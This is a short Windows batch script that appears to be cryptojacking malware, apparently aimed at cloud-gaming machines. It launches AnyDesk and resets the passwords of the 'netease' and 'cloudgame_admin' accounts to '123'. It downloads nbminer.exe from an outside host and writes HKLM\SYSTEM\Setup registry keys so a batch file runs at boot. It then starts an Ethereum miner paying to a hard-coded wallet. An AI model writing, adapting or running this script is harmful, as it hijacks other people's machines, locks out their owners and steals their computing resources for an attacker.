@echo off
start cmd.exe
start "" "C:/Program Files (x86)/AnyDesk/AnyDesk.exe"
:check
IF EXIST "C:/miner/nbminer.exe" (
cd C:/miner
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v CmdLine /t REG_SZ /d c:/1.bat /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v SetupType /t REG_DWORD /d 1 /f
start nbminer -a ethash -o stratum+ssl://luhan.vip:887 -u 0xdbe78754521a68a9c8aa2c7247c74853989cc8ac.1 -log
pause
goto check

)
ELSE (
net user netease 123
net user cloudgame_admin 123
mkdir C:/miner/miner
cd C:/miner
curl -O http://cb72441.tmweb.ru/nbminer.exe
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v CmdLine /t REG_SZ /d c:/1.bat /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\Setup /v SetupType /t REG_DWORD /d 1 /f
start nbminer -a ethash -o stratum+ssl://luhan.vip:887 -u 0xdbe78754521a68a9c8aa2c7247c74853989cc8ac.1 -log
pause
)